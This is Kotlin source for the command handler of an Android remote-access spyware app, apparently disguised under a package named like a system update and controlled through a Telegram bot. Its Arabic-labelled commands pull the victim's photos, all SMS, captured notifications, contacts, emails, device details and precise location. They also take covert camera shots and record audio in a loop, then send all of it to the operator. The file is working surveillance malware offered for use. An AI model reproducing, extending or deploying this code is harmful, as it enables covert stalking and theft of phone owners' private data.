package com.sys.update2

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.File

object CommandExecutor {

    fun handle(ctx: Context, callbackData: String, callbackId: String) {
        TelegramApi.answerCallback(callbackId)
    }

    fun handleText(ctx: Context, text: String) {
        val cmd = text.trim()
        Log.d("CmdExec", "cmd: $cmd")

        when {
            cmd == "/start" || cmd == "/menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)

            // صور
            cmd == "📸 كل الصور" || cmd == "/photos" -> fetchAllPhotos(ctx)
            cmd == "📸 آخر 50" -> fetchLastPhotos(ctx, 50)
            cmd == "🖼 آخر 200" -> fetchLastPhotos(ctx, 200)

            // SMS
            cmd == "📩 كل الرسائل" || cmd == "/sms" -> fetchAllSms(ctx)

            // الإشعارات
            cmd == "🔔 الإشعارات" || cmd == "/notifs" -> fetchAllNotifs(ctx)

            // جهات الاتصال
            cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> fetchContacts(ctx)

            // الإيميلات
            cmd == "📧 الإيميلات" || cmd == "/emails" -> fetchEmails(ctx)

            // معلومات
            cmd == "📊 معلومات الجهاز" || cmd == "/info" -> showDeviceInfo(ctx)

            // الموقع
            cmd == "📍 الموقع" || cmd == "/location" -> showLocation(ctx)

            // الكاميرا
            cmd == "🤳 تصوير أمامي" || cmd == "/cam_front" -> captureCamera(ctx, true)
            cmd == "📸 تصوير خلفي" || cmd == "/cam_back" -> captureCamera(ctx, false)

            // الصوت
            cmd == "🎤 بدء التسجيل" || cmd == "/audio_start" -> startAudio(ctx)
            cmd == "⏹ إيقاف التسجيل" || cmd == "/audio_stop" -> stopAudio(ctx)

            // الموسيقى
            cmd == "🎵 كل الموسيقى" || cmd == "/music" -> fetchAllMusic(ctx)

            // الجلب الشامل
            cmd == "🚀 جلب كل شي" || cmd == "/all" -> fetchEverything(ctx)

            cmd.startsWith("/photos") -> {
                val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
                fetchLastPhotos(ctx, n)
            }

            else -> TelegramApi.sendMessage("❓ أمر غير معروف: $cmd", KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  جهات الاتصال
    // ═══════════════════════════════════════════
    private fun fetchContacts(ctx: Context) {
        runJob(ctx, "contacts") {
            TelegramApi.sendMessage("👥 *جاري قراءة جهات الاتصال...*")
            val contacts = ContactsHelper.getAllContacts(ctx)
            if (contacts.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد جهات اتصال", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("👥 *جهات الاتصال* — ${contacts.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

            var count = 0
            for (c in contacts) {
                sb.append("👤 *${c.name}*\n")
                if (c.phones.isNotEmpty()) sb.append("📞 ${c.phones.joinToString(" , ")}\n")
                if (c.emails.isNotEmpty()) sb.append("📧 ${c.emails.joinToString(" , ")}\n")
                sb.append("\n")
                count++
                if (sb.length > 3500) {
                    TelegramApi.sendMessage(sb.toString())
                    sb.clear()
                }
                if (count >= 150) {
                    sb.append("… +${contacts.size - count} آخرين\n")
                    break
                }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    private fun fetchEmails(ctx: Context) {
        runJob(ctx, "emails") {
            TelegramApi.sendMessage("📧 *جاري قراءة الإيميلات...*")
            val emails = ContactsHelper.getAllEmails(ctx)
            if (emails.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد إيميلات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("📧 *كل الإيميلات* — ${emails.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

            for (e in emails) {
                sb.append("✉️ *${e.name}*\n")
                sb.append("`${e.email}`\n\n")
                if (sb.length > 3500) {
                    TelegramApi.sendMessage(sb.toString())
                    sb.clear()
                }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  الأوامر العامة
    // ═══════════════════════════════════════════
    private fun showMainMenu(ctx: Context) {
        TelegramApi.sendMessage(
            "🎛 *لوحة التحكم*\n\nاختر العملية من الأزرار 👇",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun showDeviceInfo(ctx: Context) {
        val info = DeviceInfo.getFullInfo(ctx)
        TelegramApi.sendMessage(info, KeyboardBuilder.replyKeyboard())
    }

    private fun showLocation(ctx: Context) {
        runJob(ctx, "location") {
            TelegramApi.sendMessage("📍 *جاري تحديد الموقع بدقة عالية...*")
            val loc = LocationHelper.getPreciseLocation(ctx)
            val text = LocationHelper.formatLocation(ctx, loc)
            TelegramApi.sendMessage(text, KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  الصور
    // ═══════════════════════════════════════════
    private fun fetchAllPhotos(ctx: Context) {
        runJob(ctx, "photos_all") {
            val all = MediaScanner.scanImages(ctx)
            sendMediaList(ctx, all, "📸 كل الصور")
        }
    }

    private fun fetchLastPhotos(ctx: Context, n: Int) {
        runJob(ctx, "photos_$n") {
            val all = MediaScanner.scanImages(ctx).take(n)
            sendMediaList(ctx, all, "📸 آخر $n صورة")
        }
    }

    private fun sendMediaList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
        if (list.isEmpty()) {
            TelegramApi.sendMessage("📭 لا توجد صور", KeyboardBuilder.replyKeyboard())
            return
        }
        var sent = 0
        var failed = 0
        for (item in list) {
            val file = File(item.path)
            if (!file.exists()) { failed++; continue }
            val ok = TelegramApi.sendPhoto(file, item.name)
            if (ok) sent++ else failed++
        }
        TelegramApi.sendMessage("$title — ${list.size}\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
    }

    // ═══════════════════════════════════════════
    //  الموسيقى
    // ═══════════════════════════════════════════
    private fun fetchAllMusic(ctx: Context) {
        runJob(ctx, "music") {
            val music = MediaScanner.scanAudio(ctx)
            if (music.isEmpty()) {
                TelegramApi.sendMessage("🎵 لا توجد موسيقى", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("🎵 *قائمة الموسيقى* — ${music.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            var count = 0
            for (m in music) {
                sb.append("🎼 ${m.name}\n")
                sb.append("   ${m.size / 1024 / 1024} MB\n\n")
                count++
                if (sb.length > 3500) {
                    TelegramApi.sendMessage(sb.toString())
                    sb.clear()
                }
                if (count >= 100) break
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  الكاميرا
    // ═══════════════════════════════════════════
    private fun captureCamera(ctx: Context, front: Boolean) {
        runJob(ctx, "cam") {
            val label = if (front) "أمامية 🤳" else "خلفية 📸"
            TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
            if (file != null && file.exists()) {
                TelegramApi.sendPhoto(file, "📷 صورة ($label)")
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل التصوير — تأكد من صلاحية الكاميرا", KeyboardBuilder.replyKeyboard())
            }
        }
    }

    // ═══════════════════════════════════════════
    //  الصوت
    // ═══════════════════════════════════════════
    private fun startAudio(ctx: Context) {
        if (AudioRecorder.isRunning()) {
            TelegramApi.sendMessage("🎤 شغّال بالفعل")
            return
        }
        AudioRecorder.startLoop(ctx)
        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل كل 10 ثواني", KeyboardBuilder.replyKeyboard())
    }

    private fun stopAudio(ctx: Context) {
        AudioRecorder.stopLoop(ctx)
        TelegramApi.sendMessage("🎤 ⏹ تم الإيقاف", KeyboardBuilder.replyKeyboard())
    }

    // ═══════════════════════════════════════════
    //  SMS
    // ═══════════════════════════════════════════
    private fun fetchAllSms(ctx: Context) {
        runJob(ctx, "sms_all") {
            val inbox = SmsReader.scanAll(ctx)
            val sent = SmsReader.scanSent(ctx)
            val all = (inbox + sent).sortedByDescending { it.optString("date") }
            if (all.isEmpty()) {
                TelegramApi.sendMessage("📩 لا رسائل", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val grouped = all.groupBy { it.optString("address", "unknown") }
            val sb = StringBuilder()
            sb.append("📩 *SMS* — ${all.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((address, msgs) in grouped) {
                sb.append("📞 *$address* (${msgs.size})\n")
                for (m in msgs.take(5)) {
                    val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
                    sb.append("  $type ${m.optString("body", "").take(80)}\n")
                }
                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\n")
                sb.append("\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  الإشعارات
    // ═══════════════════════════════════════════
    private fun fetchAllNotifs(ctx: Context) {
        runJob(ctx, "notifs") {
            val lines = DataStore.readNotifications(ctx, limit = 5000)
            val notifs = lines.mapNotNull { line ->
                try { val obj = JSONObject(line); if (obj.optString("type") == "notif") obj else null }
                catch (_: Exception) { null }
            }
            if (notifs.isEmpty()) {
                TelegramApi.sendMessage("🔔 لا إشعارات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
            val sb = StringBuilder()
            sb.append("🔔 *الإشعارات* — ${notifs.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((pkg, items) in grouped) {
                sb.append("📱 *$pkg* (${items.size})\n")
                for (n in items.take(5)) {
                    val t = n.optString("title", "")
                    val tx = n.optString("text", "")
                    if (t.isNotBlank()) sb.append("  ▸ $t\n")
                    if (tx.isNotBlank()) sb.append("    $tx\n")
                }
                if (items.size > 5) sb.append("  … +${items.size - 5}\n")
                sb.append("\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  الجلب الشامل
    // ═══════════════════════════════════════════
    private fun fetchEverything(ctx: Context) {
        runJob(ctx, "all") {
            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*")
            Thread.sleep(400)
            try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}
            Thread.sleep(400)
            try {
                val loc = LocationHelper.getPreciseLocation(ctx)
                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
            } catch (_: Exception) {}
            Thread.sleep(400)
            val photos = MediaScanner.scanImages(ctx).take(30)
            sendMediaList(ctx, photos, "📸 الصور")
            Thread.sleep(400)
            fetchAllSms(ctx)
            Thread.sleep(400)
            fetchAllNotifs(ctx)
            Thread.sleep(400)
            fetchContacts(ctx)
            Thread.sleep(400)
            fetchEmails(ctx)
            TelegramApi.sendMessage("✅ *اكتمل*", KeyboardBuilder.replyKeyboard())
        }
    }

    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e("CmdExec", "job $jobName err: ${e.message}")
                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}", KeyboardBuilder.replyKeyboard())
            }
        }.start()
    }
}
